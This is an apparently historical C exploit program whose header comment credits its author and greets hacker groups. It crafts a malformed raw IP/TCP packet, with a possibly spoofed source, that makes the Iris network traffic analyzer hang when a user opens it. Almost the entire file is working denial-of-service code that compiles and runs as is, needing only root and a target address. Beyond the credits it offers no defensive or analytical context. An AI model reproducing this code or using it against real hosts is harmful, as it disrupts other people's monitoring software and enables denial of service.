/* Denial of Service attack against :
 * Iris The Network Traffic Analyzer beta 1.01
 * ------------------------------------------------
 *
 * Will create an incorrect packet which will cause
 * Iris to hang when it is opened by a user.
 *
 * Vulnerability found by : grazer@digit-labs.org
 * Exploit code by : grazer@digit-labs.org
 *
 * Respect to the guys from eEye, for there fast
 * response.
 *
 * greetings to hit2000, hwa, synnergy, security.is
 *              digit-labs.
 *
 * ---------------> free sk8!!!! <-----------------
 *
 * ------------------------------------------------
 * http://www.digit-labs.org
 *                           grazer@digit-labs.org
 * ------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/types.h>
#include <sys/socket.h>

int build_packet(int sfd, u_long srcaddr, u_long dstaddr);

struct pseudo {
u_long saddr;
u_long daddr;
u_char zero;
u_char protocol;
u_short length;
};

int main(int argc,char **argv){
int rawfd, check, one=1;

struct sockaddr_in raddr;
struct in_addr source_ip, desti_ip;
struct ip *ip;
struct tcphdr *tcp;

        while (argc<3) {
        fprintf(stderr, "\n\n[ IRIS DoS attack - by grazer ]");
        fprintf(stderr, "\n %s localhost remotehost \n\n", argv[0] );  exit(0);}

        fprintf(stderr, "\nStarting Iris DoS...\n");
        if((check=gethostbyname(argv[2])==NULL)) {
        fprintf(stderr, "\nCannot resolve host %s\n", argv[2]); exit(0); }

        source_ip.s_addr= inet_addr(argv[1]);
        desti_ip.s_addr =       inet_addr(argv[2]);

        if ((rawfd=socket(PF_INET, SOCK_RAW, IPPROTO_TCP))<0) {
        fprintf(stderr, "\n You need root for this..");
        exit(0); }

        setsockopt(rawfd, IPPROTO_IP, IP_HDRINCL, &one, 1);

        build_packet(rawfd,source_ip.s_addr, desti_ip.s_addr);

    close(rawfd);
return 1; }


int build_packet(int sfd, u_long srcaddr,  u_long dstaddr) {

u_char packet[sizeof(struct ip) + sizeof(struct pseudo) + sizeof(struct tcphdr)];
struct sockaddr_in sin;
struct in_addr src_inaddr, dest_inaddr;
struct ip *ip = (struct ip *) packet;
struct pseudo *pseudo = (struct pseudo *) (packet + sizeof(struct ip));
struct tcphdr *tcp = (struct tcphdr *) (packet + sizeof(struct ip)
+ sizeof(struct pseudo));

        bzero(packet, sizeof(packet));
        bzero(&sin,sizeof(sin));

        src_inaddr.s_addr = srcaddr;
        dest_inaddr.s_addr = dstaddr;

        pseudo->saddr = srcaddr;
        pseudo->daddr = dstaddr;
        pseudo->zero = 1;
        pseudo->protocol=IPPROTO_TCP;
        pseudo->length = htons(sizeof (struct tcphdr));

        ip->ip_v = -1;
        ip->ip_hl = -1;
        ip->ip_id = -1;
        ip->ip_src = src_inaddr;
        ip->ip_dst = dest_inaddr;
        ip->ip_p = IPPROTO_TCP;
        ip->ip_ttl = 40;
        ip->ip_off = -1;
        ip->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
        tcp->seq = htonl(rand());
        tcp->ack = htonl(rand());

        sin.sin_family=AF_INET;
        sin.sin_addr.s_addr=dstaddr;
        sendto(sfd,packet,sizeof(struct ip) + sizeof(struct tcphdr), 0,
        (struct sockaddr *) &sin,sizeof(sin));

        fprintf(stderr, "\n Packet send... \n\n" );

   return 1;}
